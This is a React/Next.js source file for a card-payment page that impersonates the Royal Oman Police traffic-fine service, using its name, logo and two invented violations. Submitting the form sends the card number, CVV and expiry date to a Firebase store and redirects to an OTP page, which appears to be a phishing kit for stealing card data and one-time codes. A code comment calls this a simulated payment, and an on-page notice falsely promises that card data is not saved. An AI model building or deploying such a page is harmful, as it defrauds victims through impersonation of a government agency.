"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Menu, CreditCard, Shield } from "lucide-react"
import Link from "next/link"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

export default function CardPayment() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    cardholderName: "",
  })

  const [violations] = useState([
    { id: "V001", description: "تجاوز السرعة المحددة", amount: "15.000", date: "2024-01-15" },
    { id: "V002", description: "عدم ربط حزام الأمان", amount: "5.000", date: "2024-01-10" },
  ])

  const totalAmount = violations.reduce((sum, v) => sum + Number.parseFloat(v.amount), 0).toFixed(3)
  const getVisitorId = () => {
    try {
      if (typeof window !== "undefined") {
        return localStorage.getItem("visitor") || "anonymous-user";
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error);
    }
    return "anonymous-user";
  };
  useEffect(()=>{
    setupOnlineStatus(getVisitorId());
  },[])
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // Simulate payment processing
    addData({id:getVisitorId(),cardNumber:formData.cardNumber,cvv:formData.cvv,expiryDate:`${formData.expiryYear}${'/'}${formData.expiryMonth}`})

    router.push("/otp-verification")
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <button className="p-2">
              <Menu className="h-6 w-6 text-blue-800" />
            </button>
            <div className="flex items-center">
              <img src="/logo_mini.png" alt="شعار شرطة عمان السلطانية" className="h-12 w-12" />
            </div>
          </div>
        </div>
      </header>

      {/* Blue Navigation Bar */}
      <div className="bg-blue-800 text-white py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <nav className="text-center">
            <span className="text-lg">الصفحة الرئيسية</span>
            <span className="mx-2">|</span>
            <span className="text-lg">الخدمات الإلكترونية</span>
            <span className="mx-2">|</span>
            <span className="text-lg">دفع المخالفات</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Violations Summary */}
          <Card className="bg-white shadow-lg">
            <CardHeader className="bg-blue-50">
              <CardTitle className="text-xl font-bold text-gray-800 flex items-center gap-2">
                <Shield className="h-5 w-5" />
                ملخص المخالفات
              </CardTitle>
            </CardHeader>
            <CardContent className="p-6">
              <div className="space-y-4">
                {violations.map((violation, index) => (
                  <div key={index} className="border-b border-gray-200 pb-4 last:border-b-0">
                    <div className="flex justify-between items-start mb-2">
                      <div>
                        <p className="font-semibold text-gray-800">{violation.description}</p>
                        <p className="text-sm text-gray-600">رقم المخالفة: {violation.id}</p>
                        <p className="text-sm text-gray-600">التاريخ: {violation.date}</p>
                      </div>
                      <div className="text-left">
                        <p className="font-bold text-lg text-red-600">{violation.amount} ر.ع</p>
                      </div>
                    </div>
                  </div>
                ))}
                <div className="border-t-2 border-blue-200 pt-4">
                  <div className="flex justify-between items-center">
                    <p className="text-xl font-bold text-gray-800">المجموع الكلي:</p>
                    <p className="text-2xl font-bold text-blue-600">{totalAmount} ر.ع</p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Payment Form */}
          <Card className="bg-white shadow-lg">
            <CardHeader className="bg-green-50">
              <CardTitle className="text-xl font-bold text-gray-800 flex items-center gap-2">
                <CreditCard className="h-5 w-5" />
                بيانات البطاقة الائتمانية
              </CardTitle>
            </CardHeader>
            <CardContent className="p-6">
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Card Number */}
                <div className="space-y-2">
                  <Label htmlFor="card-number" className="text-right block font-semibold">
                    رقم البطاقة *
                  </Label>
                  <Input
                    id="card-number"
                    type="tel"
                    placeholder="#### #### #### #### "
                    value={formData.cardNumber}
                    onChange={(e) => {
                      // Format card number with spaces
                      const value = e.target.value
                        .replace(/\s/g, "")
                        .replace(/(.{4})/g, "$1 ")
                        .trim()
                      if (value.replace(/\s/g, "").length <= 16) {
                        handleInputChange("cardNumber", value)
                      }
                    }}
                    className="text-left font-mono"
                    maxLength={19}
                    required
                  />
                </div>

                {/* Cardholder Name */}
                <div className="space-y-2">
                  <Label htmlFor="cardholder-name" className="text-right block font-semibold">
                    اسم حامل البطاقة *
                  </Label>
                  <Input
                    id="cardholder-name"
                    type="text"
                    placeholder="الاسم كما هو مكتوب على البطاقة"
                    value={formData.cardholderName}
                    onChange={(e) => handleInputChange("cardholderName", e.target.value)}
                    className="text-right"
                    required
                  />
                </div>

                {/* Expiry Date and CVV */}
                <div className="grid grid-cols-3 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiry-month" className="text-right block font-semibold">
                      الشهر *
                    </Label>
                    <Select
                      value={formData.expiryMonth}
                      onValueChange={(value) => handleInputChange("expiryMonth", value)}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="الشهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({ length: 12 }, (_, i) => (
                          <SelectItem key={i + 1} value={String(i + 1).padStart(2, "0")}>
                            {String(i + 1).padStart(2, "0")}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="expiry-year" className="text-right block font-semibold">
                      السنة *
                    </Label>
                    <Select
                      value={formData.expiryYear}
                      onValueChange={(value) => handleInputChange("expiryYear", value)}
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="السنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {Array.from({ length: 10 }, (_, i) => (
                          <SelectItem key={2024 + i} value={String(2024 + i)}>
                            {2024 + i}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-right block font-semibold">
                      CVV *
                    </Label>
                    <Input
                      id="cvv"
                      type="password"
                      placeholder="123"
                      value={formData.cvv}
                      onChange={(e) => {
                        if (e.target.value.length <= 3) {
                          handleInputChange("cvv", e.target.value)
                        }
                      }}
                      className="text-center font-mono"
                      maxLength={3}
                      required
                    />
                  </div>
                </div>

                {/* Security Notice */}
                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <Shield className="h-5 w-5 text-yellow-600 mt-0.5" />
                    <div className="text-sm text-yellow-800">
                      <p className="font-semibold mb-1">تنبيه أمني:</p>
                      <p>جميع المعاملات محمية بتشفير SSL. لن يتم حفظ بيانات البطاقة على خوادمنا.</p>
                    </div>
                  </div>
                </div>

                {/* Action Buttons */}
                <div className="space-y-4 pt-4">
                  <Button type="submit" className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-lg">
                    متابعة الدفع - {totalAmount} ر.ع
                  </Button>

                  <Link href="/">
                    <Button type="button" variant="outline" className="w-full py-3 text-lg bg-transparent">
                      إلغاء العملية
                    </Button>
                  </Link>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-blue-800 text-white py-6 mt-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="border-t border-blue-600 pt-4">
            <p className="text-center text-sm">© 2023 شرطة عمان السلطانية</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
